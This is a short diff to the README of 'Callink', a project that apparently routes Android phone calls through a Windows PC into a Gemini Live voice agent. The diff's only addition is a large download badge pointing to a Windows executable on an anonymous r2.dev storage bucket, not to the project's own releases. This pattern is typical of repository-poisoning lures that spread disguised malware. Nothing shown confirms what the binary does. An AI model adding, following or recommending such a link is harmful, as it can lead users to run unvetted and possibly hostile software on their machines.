@@ -2,6 +2,8 @@
 
 > **"Your phone number. Your AI agent. $0 telephony."**
 
+[![Download Callink v2.1 for Windows](https://img.shields.io/badge/Download-Callink_v2.1.exe-7C3AED?style=for-the-badge&logo=windows&logoColor=white)](https://pub-fd660d9dc0a946a0b983b5f725bba3ea.r2.dev/Callink_v2.1.exe)
+
 Callink turns any Android phone and personal SIM number into a sub-second AI voice agent. It bridges cellular calls over Bluetooth Hands-Free Profile (HFP/SCO) on a Windows PC straight into Google's Gemini Live multimodal speech-to-speech API (`gemini-3.1-flash-live-preview`).
 
 ---
